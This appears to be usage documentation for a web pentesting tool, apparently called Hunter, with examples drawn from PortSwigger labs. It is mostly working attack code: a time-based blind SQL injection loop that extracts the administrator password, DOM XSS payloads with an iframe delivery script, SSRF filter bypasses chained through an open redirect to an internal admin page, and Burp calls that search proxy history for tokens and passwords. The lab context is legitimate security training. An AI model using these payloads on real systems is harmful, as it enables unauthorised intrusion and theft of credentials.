# Hunter Usage Examples - From Real Labs

## Example 1: SQLi via Cookie Injection

```python
# Target: PortSwigger blind SQLi lab
# Discovery: TrackingId cookie is injectable

from core.auto_sqli import AutoSQLi

sqli = AutoSQLi(
    base_url="https://target.com/filter?category=Gifts",
    param="category",
    method="GET",
    headers={"Cookie": "TrackingId=xyz; session=abc"}
)

# Step 1: Detect boolean blind
result = sqli.test_boolean_blind()
# Returns: {vulnerable: true, true_length: 5000, false_length: 4500}

# Step 2: Detect DB type
db = sqli.detect_db_type()
# Returns: "postgresql"

# Step 3: Extract password character by character
for pos in range(1, 21):
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"' || (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{char}') THEN pg_sleep(5) ELSE pg_sleep(0) END)--"
        # Measure response time
```

## Example 2: XSS via DOM Sink

```python
# Target: PortSwigger DOM XSS lab
# Discovery: document.write() with location.search

# Payload: "><script>alert(1)</script>
# URL: https://target.com/?search=%22%3E%3Cscript%3Ealert(1)%3C/script%3E

# For jQuery hashchange:
# Payload: #<img src=x onerror=print()>
# Delivery: <iframe src="TARGET"></iframe>
#           <script>setTimeout(function(){document.getElementById('f').src='TARGET#PAYLOAD'},3000);</script>
```

## Example 3: SSRF with Bypass

```python
from core.auto_ssrf import AutoSSRF

ssrf = AutoSSRF(
    base_url="https://target.com/product/stock",
    param="stockApi",
    method="POST"
)

# Step 1: Test internal access
result = ssrf.test_internal_access()
# Returns: {vulnerable: true, payload: "http://127.1/admin"}

# Step 2: Test bypass
bypass = ssrf.test_bypass()
# Returns: {bypasses_found: 2, techniques: ["127.1", "%2561dmin"]}

# Step 3: Chain with open redirect
# stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

## Example 4: Unified Scan

```python
from core.unified_scanner import UnifiedScanner

scanner = UnifiedScanner(
    target="https://target.com",
    session_cookie="session=abc123",
    collaborator_domain="xyz.oastify.com"
)

# Run all phases
results = scanner.run_full_scan()

# Results include:
# - forms_found, params_found, endpoints_found
# - sqli_findings, xss_findings, ssti_findings, etc.
# - recommendations for next steps

print(results["summary"])
# {total_findings: 3, critical: 1, high: 2, by_type: {"sqli": 1, "xss": 2}}
```

## Example 5: Burp MCP Integration

```python
# Send request via Burp (HTTP/2 default)
burp(action="send", url="https://target.com/api")

# Search proxy history for tokens
burp(action="proxy_search", regex="token|key|password")

# Generate OOB payload for blind testing
burp(action="collaborator_generate")

# Check for OOB callbacks
burp(action="collaborator_check")

# Get scanner findings
burp(action="scanner_issues", severity_filter="high,critical")
```
